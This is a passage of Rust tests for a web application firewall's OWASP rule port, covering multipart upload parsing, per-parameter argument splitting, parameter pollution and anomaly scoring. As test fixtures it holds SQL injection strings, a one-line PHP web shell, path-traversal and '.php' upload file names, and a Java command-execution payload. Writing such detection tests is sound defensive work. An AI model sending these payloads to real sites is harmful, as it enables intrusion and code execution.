            ("CRS-933220", "name=\"f\"; filename=\"sess_abcdefghij0123456789\"", 1),
            // `FILES_NAMES`: the form field the file was submitted under.
            ("CRS-920121", "name=\"fi;le\"; filename=\"ok.txt\"", 2),
            ("CRS-920120", "name=\"fi;le\"; filename=\"ok.txt\"", 1),
            ("CRS-920120", "name=\"f\"; filename=\"1.j\\s\\p\"", 1),
        ] {
            let ctx = upload(disposition, paranoia);
            assert!(fires(&checker, id, &ctx), "{id} must fire for {disposition}");
        }

        // The same names in the URL, the query and an ordinary form body are
        // *not* uploads and must not reach any of them.
        let mut url = make_ctx("POST", "/uploads/shell.php", 0);
        url.query = "file=sess_abcdefghij0123456789&next=/x/.htaccess".to_owned();
        for id in ["CRS-933110", "CRS-932180", "CRS-933220", "CRS-944140", "CRS-920120"] {
            assert!(!fires(&checker, id, &url), "{id} must not read the URL or query");
        }
    }

    /// `MULTIPART_PART_HEADERS` is the part's header text, one value per line.
    #[test]
    fn multipart_part_headers_back_the_922_rules() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        // CRS-922120: `Content-Transfer-Encoding` was deprecated by RFC 7578.
        let deprecated = "--b\r\nContent-Disposition: form-data; name=\"f\"\r\n\
                          Content-Transfer-Encoding: 8bit\r\n\r\nhi\r\n--b--\r\n";
        assert!(fires(&checker, "CRS-922120", &multipart_ctx("b", deprecated, 1)));

        // CRS-922130: a byte outside \x21-\x7E in a header name.
        let control = "--b\r\n\x0eContent-Disposition: form-data; name=\"f\"; filename=\"1.php\"\r\n\
                       Content-Disposition: form-data; name=\"post\"\r\n\r\nx\r\n--b--\r\n";
        assert!(fires(&checker, "CRS-922130", &multipart_ctx("b", control, 1)));

        // Neither fires on a part whose headers are ordinary — including the
        // `Content-Type:` line every browser sends, which is what the old
        // whole-envelope approximation used to trip over.
        let ordinary = "--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.pdf\"\r\n\
                        Content-Type: application/pdf\r\n\r\n%PDF-1.4\r\n--b--\r\n";
        let ctx = multipart_ctx("b", ordinary, 1);
        assert!(!fires(&checker, "CRS-922120", &ctx));
        assert!(!fires(&checker, "CRS-922130", &ctx));
    }

    /// Ordinary uploads must not be blocked. This is the regression the whole
    /// `FILES` change is judged by: CRS-920120 is a **negated** rule, so a file
    /// name the parser reads differently from upstream does not fail to match,
    /// it matches *everything*.
    #[test]
    fn benign_uploads_are_not_blocked() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let bodies = [
            // A plain single-file upload.
            "--b\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"photo.jpg\"\r\n\
             Content-Type: image/jpeg\r\n\r\n\u{ffff}JFIF binary bytes\r\n--b--\r\n",
            // A non-ASCII file name, which `[^\"';=\x5c]` admits and a broken
            // decode would not.
            "--b\r\nContent-Disposition: form-data; name=\"文件\"; filename=\"年度报告 2026.pdf\"\r\n\
             Content-Type: application/pdf\r\n\r\n%PDF-1.7 ...\r\n--b--\r\n",
            // Several files plus ordinary text fields, as a real form posts.
            //
            // The field names are `doc1` / `doc2` and not PHP's `docs[]`
            // spelling on purpose: `docs[]` trips CRS-932240 at PL2 through the
            // *body* surface, because `payload_surface` joins each part's
            // values with a newline and the rule's `[\[-\]]+[\s\x0b]*` bridges
            // it. That predates this parser (the previous reconstruction joined
            // the same way) and is not a `FILES` behaviour — CRS-932240 reads
            // `args+body+cookies+cookies_names`. Left out of this test so a real
            // regression here cannot hide behind a known unrelated one.
            "--b\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nQuarterly report\r\n\
             --b\r\nContent-Disposition: form-data; name=\"doc1\"; filename=\"q1.pdf\"\r\n\
             Content-Type: application/pdf\r\n\r\n%PDF-1.7 a\r\n\
             --b\r\nContent-Disposition: form-data; name=\"doc2\"; filename=\"q2 (final).xlsx\"\r\n\
             Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\r\n\r\nPK\u{3}\u{4}\r\n\
             --b\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSave\r\n--b--\r\n",
            // The empty file input a browser sends for an untouched field.
            "--b\r\nContent-Disposition: form-data; name=\"attachment\"; filename=\"\"\r\n\
             Content-Type: application/octet-stream\r\n\r\n\r\n--b--\r\n",
            // LF-only line endings, which some clients still emit.
            "--b\nContent-Disposition: form-data; name=\"f\"; filename=\"notes.txt\"\n\nhello\n--b--\n",
        ];
        for paranoia in [1u8, 2, 4] {
            for body in bodies {
                let ctx = multipart_ctx("b", body, paranoia);
                assert!(
                    checker.check(&ctx).is_none(),
                    "PL{paranoia}: benign upload blocked: {:?}",
                    checker.check(&ctx)
                );
            }
        }
    }

    /// A real binary upload is not an attack, and the rule set must be able to
    /// say so about bytes it has no say over.
    ///
    /// [`Self::benign_uploads_are_not_blocked`] uses hand-written stand-ins for
    /// file content (`%PDF-1.7 ...`), which is exactly the content a false
    /// positive hides behind: the failure mode is *density*, not any particular
    /// byte. A JPEG's entropy-coded segment is a uniform draw over 0..=255, so
    /// every two-byte SQL operator (`||`, `<<`, `--`, `';`) and every shell
    /// construct (`${`, `$(`, backtick) occurs in it as a matter of arithmetic —
    /// a 16 KB file contains each of them several times over.
    ///
    /// The fixture below is that argument made deterministic: every byte value,
    /// in an order that plants the specific sequences the PL1/PL2 SQL injection,
    /// RCE, PHP and XSS rules hunt for. Before file content was withheld from the
    /// parameter surface this blocked at PL1, and so did every real PDF and JPEG
    /// measured against it.
    #[test]
    fn a_binary_upload_is_not_an_attack() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        // The literals are what a regex engine finds in high-entropy bytes, not
        // an attempt at an attack: an operator, a comment introducer, a brace
        // expansion, a variable interpolation, a tag opener, a NUL.
        let mut content = String::from("||<<--';${$(`\0<x\"*,z/*!*/#\n\x0b~7@@v If( 0x41414141");
        for byte in 0u8..=255 {
            content.push(char::from(byte));
        }
        content.push_str(&content.clone());
        let body = format!(
            "--b\r\nContent-Disposition: form-data; name=\"doc\"; filename=\"report.pdf\"\r\n\
             Content-Type: application/pdf\r\n\r\n{content}\r\n--b--\r\n"
        );
        for paranoia in [1u8, 2, 4] {
            let ctx = multipart_ctx("b", &body, paranoia);
            assert!(
                checker.check(&ctx).is_none(),
                "PL{paranoia}: binary upload blocked: {:?}",
                checker.check(&ctx)
            );
        }

        // The same bytes submitted as an ordinary form field are a parameter,
        // and a parameter carrying them is exactly what these rules are for.
        // This half is what stops the fix above from degenerating into "stop
        // looking at request bodies".
        let as_field = format!("--b\r\nContent-Disposition: form-data; name=\"doc\"\r\n\r\n{content}\r\n--b--\r\n");
        assert!(
            checker.check(&multipart_ctx("b", &as_field, 1)).is_some(),
            "a non-file part must keep its coverage"
        );
    }

    /// Moving a payload into a file part is not an evasion channel.
    ///
    /// It is the first thing to check when a detection surface is narrowed, and
    /// the answer is that the narrowing tracks how the *origin* parses the same
    /// envelope: `filename=` is what puts a part in PHP's `$_FILES` instead of
    /// `$_POST`, and the equivalent split in Rails, Django, multer and Spring.
    /// A payload the application will never evaluate as a parameter is not an
    /// injection into that application — what it becomes is a stored file, and
    /// the rules that police stored files read the declared name, which is
    /// still fully inspected.
    #[test]
    fn a_file_part_is_not_a_hiding_place_for_the_rules_that_matter() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let upload = |disposition: &str, payload: &str| {
            format!("--b\r\nContent-Disposition: form-data; {disposition}\r\n\r\n{payload}\r\n--b--\r\n")
        };
        // Every one of these is judged on the *file name*, which is where the
        // upload attacks that matter actually live.
        for disposition in [
            "name=\"f\"; filename=\"shell.php\"",
            "name=\"f\"; filename=\"cmd.jsp\"",
            "name=\"f\"; filename=\"../../etc/passwd\"",
            "name=\"f\"; filename=\"a.php;.jpg\"",
            "name=\"f\"; filename=\"x'or 1=1--.png\"",
        ] {
            let body = upload(disposition, "harmless bytes");
            assert!(
                checker.check(&multipart_ctx("b", &body, 1)).is_some(),
                "PL1: hostile upload not caught: {disposition}"
            );
        }
        // And a part with no `filename=` is a parameter however it is dressed:
        // a `Content-Type: application/pdf` on a non-file part does not buy
        // silence, because the origin will not treat it as a file either.
        let disguised = "--b\r\nContent-Disposition: form-data; name=\"c\"\r\nContent-Type: application/pdf\r\n\r\n\
             <?php system($_GET['c']); ?>\r\n--b--\r\n";
        assert!(
            checker.check(&multipart_ctx("b", disguised, 1)).is_some(),
            "a web shell in a non-file part must still be caught"
        );
    }

    /// A `multipart/form-data` content type over a body that carries no such
    /// boundary must not hide that body from the `REQUEST_BODY` rules.
    ///
    /// Reducing an envelope to its (zero) part payloads is what a parser does;
    /// handing the rules an empty string for a body full of bytes is a bypass,
    /// and one an attacker reaches by setting a header.
    #[test]
    fn a_multipart_header_over_a_non_multipart_body_does_not_hide_it() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        // The payload is a `REQUEST_BODY` rule's (CRS-944100), because
        // `REQUEST_BODY` is the only collection a body no processor could parse
        // populates — upstream forces it with CRS-901340's
        // `ctl:forceRequestBodyVariable=On` for exactly this case.
        let payload = "java.lang.Runtime.getRuntime().exec(\"id\")";
        let ctx = multipart_ctx("nothing-matches-this", payload, 1);
        let view = RequestView::new(&ctx);
        assert_eq!(
            view.body.as_ref(),
            payload,
            "an unparseable envelope falls back to the whole body"
        );
        assert!(
            view.args_post().is_empty(),
            "an envelope that yielded no parts yields no parameters either"
        );
        assert!(
            checker.check(&ctx).is_some(),
            "a body must not become invisible by declaring a boundary"
        );
    }

    /// `FILES` is a surface a rule has to ask for by name — it is not part of
    /// `all`, and no rule acquires it by accident.
    #[test]
    fn the_multipart_surfaces_are_not_in_the_all_field() {
        for bit in [Surfaces::FILES, Surfaces::FILES_NAMES, Surfaces::MULTIPART_PART_HEADERS] {
            assert!(!Surfaces::ALL.has(bit), "`all` must not cover a multipart surface");
        }
        // And every spelling the converter can emit resolves to exactly one.
        for (name, bit) in [
            ("files", Surfaces::FILES),
            ("files_names", Surfaces::FILES_NAMES),
            ("multipart_part_headers", Surfaces::MULTIPART_PART_HEADERS),
        ] {
            let parsed = Surfaces::parse(name).expect("BUG: surface name is in Surfaces::NAMED");
            assert_eq!(parsed, Surfaces(bit), "{name}");
        }
    }

    /// The word-at-a-time encoded-ness guard must agree with a plain byte scan
    /// for every input — it decides whether a value is decoded at all, so a
    /// false negative is a silent bypass.
    #[test]
    fn may_be_encoded_word_scan_agrees_with_a_byte_scan() {
        fn naive(s: &str) -> bool {
            s.bytes().any(|b| b == b'%' || b == b'+')
        }
        let mut cases: Vec<String> = vec![
            String::new(),
            "%".into(),
            "+".into(),
            "中文参数值没有转义".into(),
            "\u{0}\u{1}\u{7f}\u{80}".into(),
        ];
        // A marker at every offset of every length across the 8-byte word
        // boundary, plus the all-clear strings of the same lengths.
        for len in 0..40usize {
            let clear = "a".repeat(len);
            cases.push(clear.clone());
            for pos in 0..len {
                for marker in ['%', '+'] {
                    let mut s: Vec<char> = clear.chars().collect();
                    if let Some(slot) = s.get_mut(pos) {
                        *slot = marker;
                    }
                    cases.push(s.into_iter().collect());
                }
            }
            // High-bit bytes stress the borrow trick's `& !word` term.
            cases.push("\u{ff}".repeat(len));
            cases.push(format!("{}%", "\u{80}".repeat(len)));
        }
        for case in &cases {
            assert_eq!(
                may_be_encoded(case.as_bytes()),
                naive(case),
                "word scan disagrees for {case:?} (len {})",
                case.len()
            );
        }
    }

    // ── Per-parameter `ARGS` ─────────────────────────────────────────────────

    /// The splitter's contract, including HTTP parameter pollution.
    #[test]
    fn args_are_split_before_they_are_decoded() {
        let args = decode_args("a=1&b=2");
        assert_eq!(
            args,
            vec![
                Arg {
                    name: "a".into(),
                    value: "1".into()
                },
                Arg {
                    name: "b".into(),
                    value: "2".into()
                },
            ]
        );

        // An encoded separator is part of the value, not a new member.  The old
        // decode-then-look approach turned `%26` into a `&` and `%3D` into an
        // `=`, so the rules saw parameters the origin never parses.
        assert_eq!(
            decode_args("q=a%26b%3Dc"),
            vec![Arg {
                name: "q".into(),
                value: "a&b=c".into()
            }]
        );

        // `+` is a space on a form surface, in the name as well as the value.
        assert_eq!(
            decode_args("full+name=Ada+Lovelace"),
            vec![Arg {
                name: "full name".into(),
                value: "Ada Lovelace".into()
            }]
        );

        // A member with no `=` is a *name*: `?phpsessid` is what CRS-943110
        // tests for, and reading it as an anonymous value would miss it.
        assert_eq!(
            decode_args("phpsessid"),
            vec![Arg {
                name: "phpsessid".into(),
                value: String::new()
            }]
        );

        // Empty members create no entry, as upstream.
        assert_eq!(
            decode_args("&&a=1&"),
            vec![Arg {
                name: "a".into(),
                value: "1".into()
            }]
        );
        assert!(decode_args("").is_empty());
    }

    /// HTTP parameter pollution: repeats are kept, in order, never merged.
    ///
    /// An origin may take the first, the last, or all of them; a WAF that keeps
    /// only one has a bypass for whichever the origin picks.  PHP's `a[]=1&a[]=2`
    /// array syntax is two members named `a[]` — the brackets are the
    /// application's convention, not a parser construct, and `ModSecurity` does
    /// not fold them either.
    #[test]
    fn repeated_parameters_are_all_kept() {
        assert_eq!(
            decode_args("id=1&id=2"),
            vec![
                Arg {
                    name: "id".into(),
                    value: "1".into()
                },
                Arg {
                    name: "id".into(),
                    value: "2".into()
                },
            ]
        );
        assert_eq!(
            decode_args("a%5B%5D=1&a%5B%5D=2"),
            vec![
                Arg {
                    name: "a[]".into(),
                    value: "1".into()
                },
                Arg {
                    name: "a[]".into(),
                    value: "2".into()
                },
            ]
        );

        // Both values reach the rules: a payload hidden in the second copy of a
        // polluted parameter is still detected.
        let checker = OWASPCheck::from_directory(&crs_dir());
        let ctx = probe("GET", "/s", "id=1&id=1%27%20or%201%3D1--", &[], "", 1);
        assert!(
            checker.check(&ctx).is_some(),
            "the payload in the second copy of a polluted parameter must be caught"
        );
    }

    /// The member budget bounds the work without dropping bytes.
    #[test]
    fn the_arg_budget_hands_over_its_tail_instead_of_dropping_it() {
        use waf_common::MAX_FORM_ARGS;
        let surface = (0..MAX_FORM_ARGS + 500)
            .map(|i| format!("k{i}=v{i}"))
            .collect::<Vec<_>>()
            .join("&");
        let args = decode_args(&surface);
        assert_eq!(args.len(), MAX_FORM_ARGS, "member count is bounded");

        // Nothing is unscanned: the final member carries the whole unsplit
        // remainder, so a payload parked at parameter 5000 is still inspected.
        let last = args.last().expect("the budget produces a final member");
        assert!(last.name.is_empty(), "the overflow tail is not a parameter name");
        assert!(
            last.value
                .ends_with(&format!("k{}=v{}", MAX_FORM_ARGS + 499, MAX_FORM_ARGS + 499)),
            "the overflow tail reaches the end of the surface"
        );

        let padded = format!("{surface}&q=1%27%20or%201%3D1--");
        let checker = OWASPCheck::from_directory(&crs_dir());
        assert!(
            checker.check(&probe("GET", "/s", &padded, &[], "", 1)).is_some(),
            "a payload past the member budget must still be caught"
        );
    }

    /// `ARGS_NAMES` reads names, `ARGS` reads values, and neither sees the
    /// other's text.
    #[test]
    fn arg_names_and_values_are_separate_collections() {
        let yaml = |field: &str| {
            format!(
                "version: \"1.0\"\nrules:\n  - id: TEST-A\n    name: t\n    category: test\n    \
                 severity: critical\n    paranoia: 1\n    field: {field}\n    operator: contains\n    \
                 value: needle\n    action: block\n"
            )
        };
        let names = OWASPCheck::from_yaml(&yaml("args_names"));
        let values = OWASPCheck::from_yaml(&yaml("args"));

        let in_name = probe("GET", "/", "needle=1", &[], "", 1);
        let in_value = probe("GET", "/", "k=needle", &[], "", 1);
        assert!(names.check(&in_name).is_some());
        assert!(names.check(&in_value).is_none(), "a value is not a name");
        assert!(values.check(&in_value).is_some());
        assert!(values.check(&in_name).is_none(), "a name is not a value");
    }

    /// `ARGS_GET` is the query, `ARGS_POST` is a urlencoded body, and `ARGS` is
    /// both.
    #[test]
    fn get_and_post_arguments_are_distinguishable() {
        let yaml = |field: &str| {
            format!(
                "version: \"1.0\"\nrules:\n  - id: TEST-A\n    name: t\n    category: test\n    \
                 severity: critical\n    paranoia: 1\n    field: {field}\n    operator: contains\n    \
                 value: needle\n    action: block\n"
            )
        };
        let form = &[("content-type", "application/x-www-form-urlencoded")];
        let get = probe("GET", "/", "k=needle", &[], "", 1);
        let post = probe("POST", "/", "", form, "k=needle", 1);

        let args_get = OWASPCheck::from_yaml(&yaml("args_get"));
        assert!(args_get.check(&get).is_some());
        assert!(args_get.check(&post).is_none());

        let args_post = OWASPCheck::from_yaml(&yaml("args_post"));
        assert!(args_post.check(&get).is_none());
        assert!(args_post.check(&post).is_some());

        let args = OWASPCheck::from_yaml(&yaml("args"));
        assert!(args.check(&get).is_some());
        assert!(args.check(&post).is_some());

        // A JSON body is not a form, but upstream's JSON body processor puts its
        // leaves in the same collection, so `ARGS_POST` reads them here too.
        let json = probe(
            "POST",
            "/",
            "",
            &[("content-type", "application/json")],
            r#"{"k":"needle"}"#,
            1,
        );
        assert!(args_post.check(&json).is_some(), "a JSON leaf is an ARGS_POST member");
        assert!(
            OWASPCheck::from_yaml(&yaml("args_post_names")).check(&json).is_none(),
            "`k` is the member's name, `needle` is not"
        );
        // The raw body is still the raw body — the leaves are in addition to it,
        // never instead of it, for the rules that name `REQUEST_BODY`.
        assert!(OWASPCheck::from_yaml(&yaml("body")).check(&json).is_some());

        // The multipart processor fills the same collection from the parts that
        // are not files.
        let envelope = probe(
            "POST",
            "/",
            "",
            &[("content-type", "multipart/form-data; boundary=b")],
            "--b\r\nContent-Disposition: form-data; name=\"k\"\r\n\r\nneedle\r\n--b--\r\n",
            1,
        );
        assert!(
            args_post.check(&envelope).is_some(),
            "a non-file part is an ARGS_POST member"
        );
    }

    /// A form body is handed over as parameters **or** as one blob, never both.
    ///
    /// Both at once is what would re-create the cross-parameter matching this
    /// change removes.
    #[test]
    fn a_form_body_is_not_scanned_twice() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-A\n    name: t\n    category: test\n    \
                    severity: critical\n    paranoia: 1\n    field: args_post+body\n    operator: regex\n    \
                    value: '^tab=tab$'\n    action: block\n";
        let checker = OWASPCheck::from_yaml(yaml);
        let form = &[("content-type", "application/x-www-form-urlencoded")];
        assert!(
            checker.check(&probe("POST", "/", "", form, "tab=tab", 1)).is_none(),
            "the blob must stand aside once the parameters carry the same bytes"
        );
        // A body the splitter cannot read keeps its blob.
        let text = &[("content-type", "text/plain")];
        assert!(checker.check(&probe("POST", "/", "", text, "tab=tab", 1)).is_some());
    }

    /// The four rules the missing splitter held back, each verified on its own
    /// attack **and** on the ordinary traffic it used to blame.
    #[test]
    fn per_parameter_args_unblock_the_rules_that_needed_them() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        // CRS-942130: `TX:1 @streq %{TX.2}` is a `1=1` tautology test *inside one
        // parameter*.  It was refused outright because a whole query string
        // supplies the equality through its own `name=value` separator.
        assert!(
            checker.rules.iter().any(|r| r.id == "CRS-942130"),
            "CRS-942130 must be enforced"
        );
        for benign in ["tab=tab", "sort=sort&dir=asc", "view=view", "a=b&b=a"] {
            assert!(
                !fires(&checker, "CRS-942130", &probe("GET", "/s", benign, &[], "", 2)),
                "CRS-942130 must not fire on ?{benign}"
            );
        }
        for attack in ["id=1' or 1=1", "id=1%27%20or%201%3D1", "u=x' OR 'a'='a"] {
            assert!(
                fires(&checker, "CRS-942130", &probe("GET", "/s", attack, &[], "", 2)),
                "CRS-942130 must fire on ?{attack}"
            );
        }

        // CRS-942440: upstream exempts a value that *is* a bare token or a JWT.
        // The exemption reads `MATCHED_VARS` with an anchored pattern, so it can
        // only ever hold of a single parameter value.
        let jwt = "token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
        assert!(
            !fires(&checker, "CRS-942440", &probe("GET", "/api", jwt, &[], "", 2)),
            "a JWT must be exempt from the SQL-comment rule"
        );
        assert!(
            !fires(
                &checker,
                "CRS-942440",
                &probe("GET", "/api", "token=abc--def", &[], "", 2)
            ),
            "a bare token must be exempt"
        );
        assert!(
            fires(
                &checker,
                "CRS-942440",
                &probe("GET", "/s", "id=1%27%3B--%20", &[], "", 2)
            ),
            "a real comment sequence must still be caught"
        );

        // CRS-943110 / CRS-943120 are `^…$` anchored patterns on `ARGS_NAMES`;
        // against a whole query string they could never match anything.
        let off_domain = &[("referer", "https://evil.test/a"), ("host", "example.com")];
        let no_referer = &[("host", "example.com")];
        for query in ["PHPSESSID=abc123", "foo=1&jsessionid=xyz&bar=2"] {
            assert!(
                fires(&checker, "CRS-943110", &probe("GET", "/x", query, off_domain, "", 1)),
                "CRS-943110 must fire on ?{query} with an off-domain Referer"
            );
            assert!(
                fires(&checker, "CRS-943120", &probe("GET", "/x", query, no_referer, "", 1)),
                "CRS-943120 must fire on ?{query} with no Referer"
            );
        }
        // The anchor still holds: a parameter merely *containing* the token is
        // not a session id parameter.
        for query in ["my_phpsessid_backup=1", "q=phpsessid"] {
            assert!(
                !fires(&checker, "CRS-943110", &probe("GET", "/x", query, off_domain, "", 1)),
                "CRS-943110 must not fire on ?{query}"
            );
            assert!(
                !fires(&checker, "CRS-943120", &probe("GET", "/x", query, no_referer, "", 1)),
                "CRS-943120 must not fire on ?{query}"
            );
        }
    }

    /// A chain sees the parameter its head matched, not the surface it came
    /// from.
    #[test]
    fn a_chain_reads_the_parameter_its_head_matched() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-CHAIN\n    name: t\n    category: test\n    \
                    severity: critical\n    paranoia: 1\n    field: args\n    operator: contains\n    \
                    value: alpha\n    chain:\n      - field: matched_value\n        operator: contains\n        \
                    value: beta\n    action: block\n";
        let checker = OWASPCheck::from_yaml(yaml);
        assert!(
            checker.check(&probe("GET", "/", "x=alphabeta", &[], "", 1)).is_some(),
            "one parameter carrying both halves fires"
        );
        assert!(
            checker
                .check(&probe("GET", "/", "x=alpha&y=beta", &[], "", 1))
                .is_none(),
            "two parameters must not be stitched together"
        );
        // Every member is tried, not just the first that matched the head.
        assert!(
            checker
                .check(&probe("GET", "/", "x=alpha&y=alphabeta", &[], "", 1))
                .is_some(),
            "a later member that carries the whole chain still fires"
        );
    }

    /// Cookie names are their own collection, as `REQUEST_COOKIES_NAMES`.
    #[test]
    fn cookie_names_are_readable_apart_from_cookie_values() {
        let yaml = |field: &str| {
            format!(
                "version: \"1.0\"\nrules:\n  - id: TEST-C\n    name: t\n    category: test\n    \
                 severity: critical\n    paranoia: 1\n    field: {field}\n    operator: equals\n    \
                 value: needle\n    action: block\n"
            )
        };
        // `equals` is scalar-only, so use `contains` for the collection fields.
        let yaml = |field: &str| yaml(field).replace("operator: equals", "operator: contains");
        let names = OWASPCheck::from_yaml(&yaml("cookies_names"));
        let values = OWASPCheck::from_yaml(&yaml("cookies"));
        let in_name = probe("GET", "/", "", &[("cookie", "needle=1; other=2")], "", 1);
        let in_value = probe("GET", "/", "", &[("cookie", "k=needle; other=2")], "", 1);
        assert!(names.check(&in_name).is_some());
        assert!(names.check(&in_value).is_none());
        assert!(values.check(&in_value).is_some());
        assert!(values.check(&in_name).is_none());
    }

    // ── Anomaly scoring (upstream CRS 949110) ────────────────────────────────

    /// A rule set of `n` rules, each matching a distinct query parameter, at
    /// the given severity.  `severities[i]` backs parameter `p{i}`.
    fn scored_rules_yaml(severities: &[&str]) -> String {
        let mut yaml = String::from("version: \"1.0\"\nrules:\n");
        for (index, severity) in severities.iter().enumerate() {
            let _ = write!(
                yaml,
                "  - id: TEST-{index}\n    name: probe {index}\n    category: test\n    \
                 severity: {severity}\n    paranoia: 1\n    field: query\n    operator: contains\n    \
                 value: \"p{index}\"\n    action: block\n"
            );
        }
        yaml
    }

    fn scoring_ctx(query: &str) -> RequestCtx {
        make_ctx_with_query(query)
    }

    /// The four CRS severity names carry the weights upstream gives them in
    /// `REQUEST-901-INITIALIZATION.conf` (901320..901330).
    #[test]
    fn severity_names_carry_the_upstream_weights() {
        let scoring = AnomalyScoring::default();
        assert_eq!(scoring.score_for(Severity::Critical), 5);
        assert_eq!(scoring.score_for(Severity::Error), 4);
        assert_eq!(scoring.score_for(Severity::Warning), 3);
        assert_eq!(scoring.score_for(Severity::Notice), 2);
        assert_eq!(scoring.inbound_threshold, 5);

        assert_eq!(Severity::parse("CRITICAL"), Some(Severity::Critical));
        assert_eq!(Severity::parse("Error"), Some(Severity::Error));
        assert_eq!(Severity::parse("warning"), Some(Severity::Warning));
        assert_eq!(Severity::parse("notice"), Some(Severity::Notice));
        // The converter's earlier response-phase vocabulary, kept readable
        // rather than silently defaulted: upstream 953100 is `severity:'ERROR'`.
        assert_eq!(Severity::parse("high"), Some(Severity::Error));
        assert_eq!(Severity::parse("nonsense"), None);
    }

    /// The point that decides whether this change is safe: a single `critical`
    /// rule scores 5 against a threshold of 5, so it still blocks alone.
    #[test]
    fn one_critical_rule_still_blocks_on_its_own() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["critical"]));
        let hit = checker.check(&scoring_ctx("x=p0")).expect("critical must block alone");
        assert_eq!(hit.rule_id.as_deref(), Some("TEST-0"));
        assert!(hit.detail.contains("score 5 reached the threshold 5"), "{}", hit.detail);
    }

    /// …and the mirror image: a single `warning` rule is 3 of the 5 needed, so
    /// it no longer blocks — which is exactly what upstream does with it.
    #[test]
    fn one_warning_rule_scores_but_does_not_block() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["warning"]));
        assert!(checker.check(&scoring_ctx("x=p0")).is_none());
    }

    /// A single `error` rule is 4 of 5 — also short on its own.
    #[test]
    fn one_error_rule_scores_but_does_not_block() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["error"]));
        assert!(checker.check(&scoring_ctx("x=p0")).is_none());
    }

    /// Two sub-threshold rules corroborate each other and cross the line. This
    /// is the case the old first-match-wins engine could not express at all in
    /// one direction and over-expressed in the other.
    #[test]
    fn two_warning_rules_accumulate_past_the_threshold() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["warning", "warning"]));
        assert!(checker.check(&scoring_ctx("x=p0")).is_none(), "one warning is 3");
        let both = checker
            .check(&scoring_ctx("x=p0&y=p1"))
            .expect("3 + 3 must reach the threshold of 5");
        assert!(
            both.detail.contains("score 6 reached the threshold 5"),
            "{}",
            both.detail
        );
        assert!(both.detail.contains("TEST-0"), "{}", both.detail);
        assert!(both.detail.contains("TEST-1"), "{}", both.detail);
    }

    /// A notice (2) and a warning (3) also add up to exactly the threshold.
    #[test]
    fn a_notice_and_a_warning_reach_the_threshold_together() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["notice", "warning"]));
        assert!(checker.check(&scoring_ctx("x=p0")).is_none());
        assert!(checker.check(&scoring_ctx("x=p1")).is_none());
        assert!(checker.check(&scoring_ctx("x=p0&y=p1")).is_some());
    }

    /// The verdict names the heaviest contributor, and ties keep load order —
    /// the same precedence the pre-scoring check had.
    #[test]
    fn the_verdict_names_the_heaviest_contributor_and_ties_keep_load_order() {
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["warning", "critical"]));
        let hit = checker.check(&scoring_ctx("x=p0&y=p1")).expect("3 + 5 blocks");
        assert_eq!(hit.rule_id.as_deref(), Some("TEST-1"), "critical outweighs warning");

        let tied = OWASPCheck::from_yaml(&scored_rules_yaml(&["critical", "critical"]));
        let hit = tied.check(&scoring_ctx("x=p0&y=p1")).expect("5 + 5 blocks");
        assert_eq!(hit.rule_id.as_deref(), Some("TEST-0"), "a tie goes to the first rule");
    }

    /// `deny` is unconditional: it does not wait for a score, and it says so.
    #[test]
    fn a_deny_rule_blocks_regardless_of_the_score() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-DENY\n    name: virtual patch\n    \
                    category: test\n    severity: notice\n    paranoia: 1\n    field: query\n    \
                    operator: contains\n    value: \"p0\"\n    action: deny\n";
        let checker = OWASPCheck::from_yaml(yaml);
        let hit = checker.check(&scoring_ctx("x=p0")).expect("deny must block alone");
        assert_eq!(hit.rule_id.as_deref(), Some("TEST-DENY"));
        assert!(hit.detail.contains("action=deny"), "{}", hit.detail);
    }

    /// `log` records the match and contributes nothing, so it can never block
    /// by itself or push another rule over the line.
    #[test]
    fn a_log_rule_contributes_no_score() {
        let yaml = "version: \"1.0\"\nrules:\n  - id: TEST-LOG\n    name: observation\n    \
                    category: test\n    severity: critical\n    paranoia: 1\n    field: query\n    \
                    operator: contains\n    value: \"p0\"\n    action: log\n";
        let checker = OWASPCheck::from_yaml(yaml);
        assert!(checker.check(&scoring_ctx("x=p0")).is_none());
    }

    /// The threshold is the operator's dial. Lowering it to 3 lets a lone
    /// warning block again; raising it to 6 stops a lone critical.
    #[test]
    fn the_threshold_is_configurable() {
        let permissive = OwaspConfig {
            inbound_anomaly_score_threshold: 6,
            ..OwaspConfig::default()
        };
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["critical"])).with_config(&permissive);
        assert!(checker.check(&scoring_ctx("x=p0")).is_none(), "5 < 6");

        let strict = OwaspConfig {
            inbound_anomaly_score_threshold: 3,
            ..OwaspConfig::default()
        };
        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["warning"])).with_config(&strict);
        assert!(checker.check(&scoring_ctx("x=p0")).is_some(), "3 >= 3");
    }

    /// A threshold of 0 would be reached by a request that matched nothing.
    /// The config rejects it, and the runtime clamps it as a second line.
    #[test]
    fn a_zero_threshold_is_rejected_and_clamped() {
        let broken = OwaspConfig {
            inbound_anomaly_score_threshold: 0,
            ..OwaspConfig::default()
        };
        assert!(broken.validate().is_err());

        let checker = OWASPCheck::from_yaml(&scored_rules_yaml(&["critical"])).with_config(&broken);
        assert!(
            checker.check(&scoring_ctx("nothing=matches")).is_none(),
            "a clamped threshold must not turn an empty match set into a block"
        );
    }

    /// Turning scoring off restores the pre-scoring behaviour exactly: the
    /// first matching rule blocks whatever its severity.
